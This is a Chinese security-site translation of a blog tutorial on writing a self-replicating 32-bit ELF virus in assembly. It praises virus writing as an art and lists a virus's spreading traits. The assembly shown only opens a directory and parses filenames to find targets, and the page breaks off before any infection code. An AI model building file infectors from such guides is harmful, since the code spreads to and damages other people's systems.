<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns:wb="http://open.weibo.com/wb" xml:lang="en" lang="en">
<head>
    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
    <meta name="viewport"
          content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no"/>
    <link rel="shortcut icon" href="http://bobao.360.cn/favicon.ico?v=1.1"/>
    <link rel="alternate" title="安全资讯" href="/rss?type=news" type="application/rss+xml"/>
    <link rel="alternate" title="安全知识" href="/rss?type=learning" type="application/rss+xml"/>
    <link rel="alternate" title="安全圈活动" href="/rss?type=activity" type="application/rss+xml"/>
    <link rel="alternate" title="所有漏洞" href="/rss?type=vul" type="application/rss+xml"/>
    <link rel="alternate" title="通用型漏洞" href="/rss?type=commonvul" type="application/rss+xml"/>
    <link rel="alternate" title="事件型漏洞" href="/rss?type=eventvul" type="application/rss+xml"/>
    <link rel="alternate" title="热门漏洞" href="/rss?type=hotvul" type="application/rss+xml"/>

        <title>【技术分享】如何使用汇编语言编写一个病毒 - 安全客 - 有思想的安全新媒体</title>
    
        <meta name="keywords" content="汇编语言编写病毒,病毒分析"/>
    
        <meta name="description" content="本文主要讲了如何使用汇编语言编写一个32位ELF格式的病毒。"/>
        <meta property="wb:webmaster" content="224437c7be31d633"/>

    <script type="text/javascript" src="http://s7.qhimg.com/!56caa871/xpc_sync_height.js"></script>
    <link rel="stylesheet" type="text/css" href="/css/reset.css" />
    <link rel="stylesheet" type="text/css" href="/css/common_new.css?v=4.4.2.1" />
    <link rel="stylesheet" type="text/css" href="/css/jquery.notyfy.css" />
    <link rel="stylesheet" type="text/css" href="/css/notyfy.theme.default.css" />
    <link rel="stylesheet" type="text/css" href="/css/s_common.css?v=2.2.7" media="only screen and
    (max-device-width:900px), only screen and (max-width:900px)" />
    <script type="text/javascript" src="/js/jquery.min.js?v=3.1"></script>
    <script type="text/javascript" src="/js/jquery.notyfy.js"></script>
    <script type="text/javascript" src="/js/iscroll.js"></script>
    <script src="http://js.passport.qihucdn.com/5.0.3.js"></script>
    <script type="text/javascript">
        var myScroll, myNavScroll;

        function iscrollLoaded() {
            myScroll = new IScroll('#wrapper',
                {
                    scrollX: true,
                    scrollY: false,
                    bounceEasing: 'circular',
                    eventPassthrough: true,
                    preventDefault: false,
                    bounceTime: 500
                }
            );
        }

        $(function () {

            //导航横向滚动


            function setNavWidth() {

                /* 计算导航宽度 */
                var allWidth = $(window).width();
                var scroller = $('#scroller');

                if (allWidth > 900) {
                    scroller.find('ul').add(scroller.find('.scroll')).removeAttr('style');
                    scroller.css('overflow', 'visible');
                    if (myNavScroll) myNavScroll.destroy();
                } else {

                    var width = 0;
                    scroller.find('.scroll').children('ul').children('li').each(function (index, el) {
                        if (!$(this).hasClass('mobile-hide')) {
                            width += $(this).outerWidth();
                        }
                    });
                    scroller.find('ul').add(scroller.find('.scroll')).width(width);

                    if (myNavScroll) myNavScroll.destroy();

                    myNavScroll = new IScroll('#scroller', {
                        scrollX: true,
                        scrollY: false,
                        momentum: false,
                        click: true
                    });

                }

            }

            setNavWidth();
            $(window).resize(function (event) {
                setNavWidth();
            });

        });

    </script>
</head>
<body onload="iscrollLoaded();">
<div style='margin:0 auto;width:0px;height:0px;overflow:hidden;'>
    <img src=""/>
</div>

<div id="is-mobile"></div>
<div class="container">
        <div class="mobile-header">
        <div class="header clearfix">
            <div class="header-wrapper clearfix">
                <a href="/index/index" class="logo"><img class="slogan" src="/img/logo.png?v=1.5"/></a>
                                <form id="search" class="search-box" action="/search/index" method="GET">
                    <input class="keys" name="keywords" type="text" placeholder="搜索漏洞" required="required">
                    <input class="icon" type="submit" value="">
                    <input type="hidden" name="type" value=""/>
                </form>
                <div class="bug">
                    <div class="name"><span class="seled">全部</span><i class="arrow"></i></div>
                    <ul class="typelist">
                        <li data-index="3"><a href="javascript:void(0);">全部</a></li>
                        <li data-index="0"><a href="javascript:void(0);">漏洞</a></li>
                        <li data-index="1"><a href="javascript:void(0);">资讯</a></li>
                        <li data-index="2"><a href="javascript:void(0);">知识</a></li>
                    </ul>
                </div>
                                <div class="logNreg mobile-hide">
                    <div class="unlog">
                        <i></i>
                        <a href="log.html" class="log">登录</a>
                        <span>|</span>
                        <a href="reg.html" class="reg">注册</a>
                    </div>
                    <div class="loged">
                        <a href="/member/profile" class="user-center"><i></i><span class="user-name-tag">个人中心</span></a>
                        <div class="user-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting"><a href="http://i.360.cn/profile/accountmanage"
                                                               target="_blank"><i></i><span>账号设置</span></a></li>
                                <li class="alert-setting"><a href="/keywords/index"
                                                             target="_blank"><i></i><span>告警设置</span></a></li>
                                <li class="bug-alert"><a href="/myalarm/index" target="_blank"><i></i><span>漏洞告警</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mylearn/index" target="_blank"><i></i><span>我的知识</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mycourse/index" target="_blank"><i></i><span>我的课堂</span></a>
                                </li>
                                <li class="my-exit"><a
                                            href="http://login.360.cn/?src=pcw_adlab&op=logout&destUrl=http://bobao.360.cn"><i></i><span>退出系统</span></a>
                                </li>
                            </ul>
                        </div>

                        <a href="/message" class="message-center" target="_blank"><i></i><span>我的消息</span></a>
                        <div class="message-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting" style="display:none;"><a href="/myres/index"
                                                                                     target="_blank"><i></i><span>回复我的</span></a>
                                </li>
                                <li class="my-bug"><a href="/myvul/index"
                                                      target="_blank"><i></i><span>我的漏洞</span></a></li>
                                <!--<li class="my-bug"><a href="/myres/index" target="_blank"><i></i><span>我的评论</span></a></li>-->
                                <!--<li class="alert-setting"><a href="###" target="_blank"><i></i><span>提到我的</span></a>
                                </li>-->
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <style type="text/css">
            .nav {
                overflow: hidden;
            }

            .nav .scroll {
                width: auto;
            }
        </style>
        <div id="wrapper">
            <div id="scroller" class="nav">
                <div class="scroll">
                    <ul class="nav-list">
                        <li ><a class="link-nav"
                                                                                 href="/index/index">首页</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/vul/index">漏洞</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/introduce/list">招聘</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/news/index">资讯</a><!--<i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/introduce/list">招聘</a></li>
                        </ul>
			-->
                        </li>
                        <li class="cur">
                        <a class="link-nav" href="/learning/index">知识</a><i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/course/index">学院</a></li>
                        </ul>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/activity/index">活动</a></li>
                        <li class="mobile-hide "><a class="link-nav"
                                                                                                   href="/ctf/index">CTF训练营</a>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/interref/list">安全内参</a></li>
                        <li ><a class="link-nav" href="/app/index">APP</a></li>

                        <!--<li ><a href="/course/index">学院</a></li>-->
                        <!--<li ><a href="/introduce/list">招聘</a></li>-->
                        <!--<li  class="mobile-hide"><a href="/ctf/index">CTF训练营</a></li>-->
                    </ul>
                </div>
            </div>
        </div>
    </div>
    
    <div class="mobile-content">
        <link rel="stylesheet" type="text/css" href="/css/news.css?v=3.5" />
<link rel="stylesheet" type="text/css" href="/ue/SyntaxHighlighter/shCoreDefault.css?v=1.0" />
<style>
    p .syntaxhighlighter {
        width: 80%;
    }
</style>

<div class="cur-pos w1000">当前位置：<a href="http://bobao.360.cn/">安全客</a> &gt;&gt; 知识详情</div>

<div class="content clearfix">
    <div class="main">
        <div class="article">
            <div id="article_box">
                <h2>【技术分享】如何使用汇编语言编写一个病毒</h2>
                <div class="article-msg">
                    <span class="time">2017-01-04 15:21:55</span>
                    
                                        <span class="read">阅读：19944次</span>
                    <span><a style="display: none;" class="good" href="javascript:;"
                             data-target="/learning/good" data-value="g_3371"
                             data-type="learning">点赞(0)</a></span>
                    <span><a class="fav" href="javascript:;" data-target="/mylearning/add"
                             data-pk="3371" data-type="learning">收藏</a></span>
                                        <span><a style="margin-left: 4px;" class="fav" href="https://cranklin.wordpress.com/2016/12/26/how-to-create-a-virus-using-the-assembly-language/"
                             target="_blank">来源： cranklin.wordpress.com</a></span>
                    
                    
                    <div style="margin-top:10px; ">
                        <a href="/member/contribute?uid=32687245" style="color:#848e99;">
                            <img src="http://p1.qhmsg.com/dm/150_150_100/t01d4ea8c0902960116.jpg" data-is-avatar="true"
                                 style="border: 1px solid #d5d5d5;padding: 2px; width: 80px;height: 80px;border-radius: 43px;"/>
                        </a>

                    </div>
                    <span class="orig">作者：<a href="/member/contribute?uid=32687245" style="color:#848e99;">维一零</a></span>
                                    </div>
                <hr size="1">
                <div class="article-msg">
                    <p><!-- JiaThis Button BEGIN -->

<!--
<span class="jiathis_style"><span class="jiathis_txt">分享到：</span>
	<a class="jiathis_button_weixin"></a>
	<a class="jiathis_button_tsina"></a>
    <a class="jiathis_button_tqq"></a>
    <a class="jiathis_button_qzone"></a>
    <a class="jiathis_button_renren"></a>
    <a class="jiathis_button_xiaoyou"></a>
    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
</span>

-->
</p>
                </div>
                <p><p style="text-align:center"><img src="http://p1.qhimg.com/t01d440a9b78dc4c96e.jpg" title="t019856a1db0a054bf1.jpg" alt="http://p1.qhimg.com/t019856a1db0a054bf1.jpg"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family:微软雅黑, Microsoft YaHei"></span></strong></span></p><p style="white-space: normal; text-indent: 2em;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;">翻译：</span></strong></span><a href="http://bobao.360.cn/member/contribute?uid=32687245" target="_blank" textvalue="维一零" style="text-decoration: none;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;">维一零</span></strong><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;"></span></strong></span></a></p><p style="white-space: normal; text-indent: 2em;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;">预估稿费：300RMB（不服你也来投稿啊！）</span></strong></span></p><p style="white-space: normal; text-indent: 2em;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;"><strong><strong>投稿方式：发送邮件至</strong><a href="mailto:linwei@360.cn" target="_self" style="text-decoration: none;"><span style="color: rgb(0, 112, 192);"><strong>linwei#360.cn</strong></span></a><strong>，或登陆</strong><a href="http://bobao.360.cn/contribute/index" target="_blank" style="color: rgb(0, 112, 192); text-decoration: none;"><strong>网页版</strong></a><strong>在线投稿</strong></strong></span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family:微软雅黑, Microsoft YaHei"><br/></span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family:微软雅黑, Microsoft YaHei">前言</span></strong></span><br/></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">病毒编写的艺术似乎丢失了似的。我们不要将恶意软件，特洛伊木马，蠕虫等等混淆成病毒。你可以使用任何友好的脚本语言去编写那些垃圾程序并且拍着自己的后背嘚瑟一下，但这并不能让你成为一个病毒作者。编写计算机病毒并不一定就是你所看到的关于破坏，还得要看你的病毒可以传播多广泛同时避免被检测，也得要比杀毒软件公司更为聪明。这事关创新和创造力。一个计算机病毒在很多方面就像一个纸飞机。你需要使用聪明和具有创造性的方式去折飞机，并试图使它在不可避免的着陆前尽可能长久的飞翔。在万维网之前，传播病毒是一种挑战。运气好的话，它会感染除了你自己之外的任何电脑。如果运气更好点，你的病毒将获得像鲸鱼病毒或米开朗基罗病毒一样的名声。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">如果你想被视为一个“病毒作者”，你必须获得这类称号。在地下黑客组织里，在黑客/破解者/入侵者之中，我最尊重的是病毒作者。因为不是任何人都能做到，那是真的能够表现出他比别人拥有更深的、关于系统和软件方面的知识。你不能指望简单地遵循常规就能成为一个病毒作者。编写一个真正的病毒需要比一般“黑客”拥有更多的技能。多年以来，我没有成功的写出一个可以运行良好的二进制文件感染病毒。一直就是报错、报错、报错。这是一件令人沮丧的事情。因此我坚持编写蠕虫、木马炸弹和ANSI炸弹。我坚持编写BBS的漏洞利用，也去逆向视频游戏软件以破解其版权保护。每当我以为我的汇编技术终于足够，试图编写出一个病毒的时候，失败再次地落到我的脸上。我花了好几年的时间才能够编写出一个真正可运行的病毒。这就是为什么我着迷于病毒并且想找出一些真正的病毒作者。在瑞安“elfmaster”奥尼尔传奇的书籍《学习Linux二进制程序分析》中，他指出：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这是一个超越常规编程约定的伟大挑战工程，它要求开发人员跳出传统模式，去操纵代码、数据和环境使其以某种方式表现，在与AV杀毒软件开发者的交流时，令我吃惊的是，他们旁边没有人有任何真正关于如何逆向一个病毒的想法，更不用说去设计什么真正的启发式来识别它们（除了签名）。事实上，病毒编写是非常困难的，并且需要标准比较严格的技能。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">使用汇编语言编写一个病毒</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em; color: rgb(255, 0, 0);">病毒是一种艺术。汇编和C（不使用代码库）将是你的画笔。今天，我将帮助你经历一些我面临过的挑战。让我们开始吧，看看你是否拥有成为一个艺术家的潜能！</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">与我之前的“源代码感染”病毒教程不同，这是更先进且具有挑战性的经历/运用（即使对经验丰富的开发人员）。但是，我鼓励你继续阅读并尽你所能地汲取。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">让我们先描述一下我认为的、一个真正病毒应该有的特点：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">——病毒会感染二进制可执行文件</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">——病毒代码必须是独立的，它独立于其他文件、代码库、程序等</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">——被感染的宿主文件能够继续执行并且传播病毒</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">——病毒在不损害宿主文件的情况下表现得像一只寄生虫。受感染的宿主应继续像它被感染之前一样执行</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">因为我们要感染二进制可执行文件，所以简要列表介绍几个不同的可执行文件类型。</span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">ELF</span></strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">-（可执行和链接的文件格式）Unix和类Unix系统标准的的二进制文件格式。这也被许多手机，游戏机（Playstation，任天堂）等等使用。</span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Mach-O</span></strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">-（Mach对象）被NeXTSTEP，macOS，iOS等等，所使用的二进制可执行文件格式，你其实在用它，因为所有的苹果手机都是这。</span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">PE</span></strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">-（便携式可执行程序）用于32位和64位微软操作系统</span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">MZ</span></strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">（DOS）- DOS支持的可执行文件格式…所有的微软32位及以下操作系统使用</span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">COM</span></strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">（DOS）- DOS支持的可执行文件格式…所有的微系32位及以下操作系统使用</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">微软的病毒教程有许多，但是ELF病毒似乎更具挑战性并且教程稀缺，<span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(255, 0, 0);">所以我将主要关注的是32位ELF程序的感染。</span></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我将假设读者至少对病毒复制的方式有一个常规的理解。如果没有，我推荐你阅读我以前的博客文章主题：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><a href="https://cranklin.wordpress.com/2011/04/19/how-to-write-a-stupid-simple-computer-virus-in-3-lines-of-code/" _src="https://cranklin.wordpress.com/2011/04/19/how-to-write-a-stupid-simple-computer-virus-in-3-lines-of-code/">https://cranklin.wordpress.com/2011/04/19/how-to-write-a-stupid-simple-computer-virus-in-3-lines-of-code/</a></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><a href="https://cranklin.wordpress.com/2011/11/29/how-to-create-a-computer-virus/" _src="https://cranklin.wordpress.com/2011/11/29/how-to-create-a-computer-virus/">https://cranklin.wordpress.com/2011/11/29/how-to-create-a-computer-virus/</a></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><a href="https://cranklin.wordpress.com/2012/05/10/how-to-make-a-simple-computer-virus-with-python/" _src="https://cranklin.wordpress.com/2012/05/10/how-to-make-a-simple-computer-virus-with-python/">https://cranklin.wordpress.com/2012/05/10/how-to-make-a-simple-computer-virus-with-python/</a></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">第一步是找到要感染的文件。DOS指令集可以方便寻找文件。<strong>AH:4Eh INT 21</strong>指令能够基于给定的文件描述找到第一个匹配的文件，而<strong>AH:4Fh INT 21</strong>指令可以找到下一个匹配的文件。不幸的是，对于我们却不会这么简单。使用Linux汇编来检索文件列表，这相关的文档并不是很多。少数的几个回答中我们发现它依赖于POSIX系统的readdir()函数。但是我们是黑客，对么？让我们做黑客应该做的事情来实现它。你应该熟悉的工具是strace。通过运行strace ls，我们看到了当运行ls命令时，跟踪到的系统调用和信号。</span></p><p style="text-align:center"><img src="http://p8.qhimg.com/t01b8283dd2f2d20ace.png" title="t01cb664daad72ad6bf.png" alt="http://p1.qhimg.com/t01cb664daad72ad6bf.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">你感兴趣的调用是getdents。所以下一步是在<a href="http://syscalls.kernelgrok.com/" _src="http://syscalls.kernelgrok.com/">http://syscalls.kernelgrok.com/</a></span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">查找”getdents”。这将给我们一个小小的提示，关于我们应该怎样使用它以及我们如何得到一个目录列表。下面就是我所发现的东西：</span></p><pre class="brush:plain;toolbar:false">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;eax,&nbsp;5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;sys_open
&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;ebx,&nbsp;folder&nbsp;;&nbsp;目录名称
&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;ecx,&nbsp;0
&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;edx,&nbsp;0
&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;80h
&nbsp;&nbsp;&nbsp;&nbsp;cmp&nbsp;eax,&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;检测在eax中的fd是否&nbsp;&gt;&nbsp;0&nbsp;（ok）&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;jbe&nbsp;error&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;不能打开文件，&nbsp;&nbsp;以错误状态退出&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;ebx,&nbsp;eax&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;eax,&nbsp;0xdc&nbsp;&nbsp;&nbsp;;&nbsp;sys_getdents64&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;ecx,&nbsp;buffer&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;edx,&nbsp;len&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;80h&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;eax,&nbsp;6&nbsp;&nbsp;;&nbsp;关闭
&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;80h</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">现在，我们指定的缓冲区里已经有了目录的内容，我们必须去解析它。出于某种原因，每个文件名的偏移量似乎并没有一致，但也可能是我错了。不过我只对那些原始的文件名字符串感兴趣。我所做的是打印缓冲区到标准输出，然后保存它到另一个文件，再使用十六进制编辑器来打开它。我发现的规律是每个文件名都带有一个前缀，前缀由十六进制值0x00（null）后紧跟一个十六进制0x08构成。文件名是以null为终止的（后缀为一个十六进制0x00）。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">find_filename_start:
&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;寻找在一个文件名开始前的序列0008
&nbsp;&nbsp;&nbsp;&nbsp;add&nbsp;edi,&nbsp;1
&nbsp;&nbsp;&nbsp;&nbsp;cmp&nbsp;edi,&nbsp;len&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;jge&nbsp;done&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;cmp&nbsp;byte&nbsp;[buffer+edi],&nbsp;0x00&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;jnz&nbsp;find_filename_start&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;add&nbsp;edi,&nbsp;1
&nbsp;&nbsp;&nbsp;&nbsp;cmp&nbsp;byte&nbsp;[buffer+edi],&nbsp;0x08&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;jnz&nbsp;find_filename_start&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;xor&nbsp;ecx,&nbsp;ecx&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;清空ecx，其将作为文件的偏移&nbsp;
find_filename_end:
&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;清空ecx，其将作为文件的偏移&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;add&nbsp;edi,&nbsp;1&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;cmp&nbsp;edi,&nbsp;len&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;jge&nbsp;done
&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;bl,&nbsp;[buffer+edi]&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;从缓冲区里移动文件名字节
&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;[file+ecx],&nbsp;bl&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;inc&nbsp;ecx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;增加保存在ecx的偏移量
&nbsp;&nbsp;&nbsp;&nbsp;cmp&nbsp;byte&nbsp;[buffer+edi],&nbsp;0x00&nbsp;;&nbsp;代表文件名的结尾
&nbsp;&nbsp;&nbsp;&nbsp;jnz&nbsp;find_filename_end
&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;byte&nbsp;[file+ecx],&nbsp;0x00&nbsp;;&nbsp;到这我们就拿到文件名了，在其尾部添加一个0x00
&nbsp;&nbsp;&nbsp;&nbsp;;;&nbsp;对该文件做一些操作&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;jmp&nbsp;find_filename_start&nbsp;;&nbsp;找下一个文件</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">其实有更好的方法来做这些事。你所需要做的只是去匹配目录条目结构的字节：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">struct&nbsp;linux_dirent&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;unsigned&nbsp;long&nbsp;&nbsp;d_ino;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;Inode&nbsp;number&nbsp;*/
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;unsigned&nbsp;long&nbsp;&nbsp;d_off;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;下一个linux_dirent的偏移&nbsp;*/
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;unsigned&nbsp;short&nbsp;d_reclen;&nbsp;&nbsp;/*&nbsp;这个linux_dirent的长度&nbsp;*/
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;char&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;d_name[];&nbsp;&nbsp;/*&nbsp;文件名&nbsp;（null结尾）&nbsp;*/
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;length&nbsp;is&nbsp;actually&nbsp;(d_reclen&nbsp;-&nbsp;2&nbsp;-
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;offsetof(struct&nbsp;linux_dirent,&nbsp;d_name))&nbsp;*/
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;/*
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;char&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pad;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Zero&nbsp;padding&nbsp;byte
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;char&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;d_type;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;File&nbsp;type&nbsp;(only&nbsp;since&nbsp;Linux
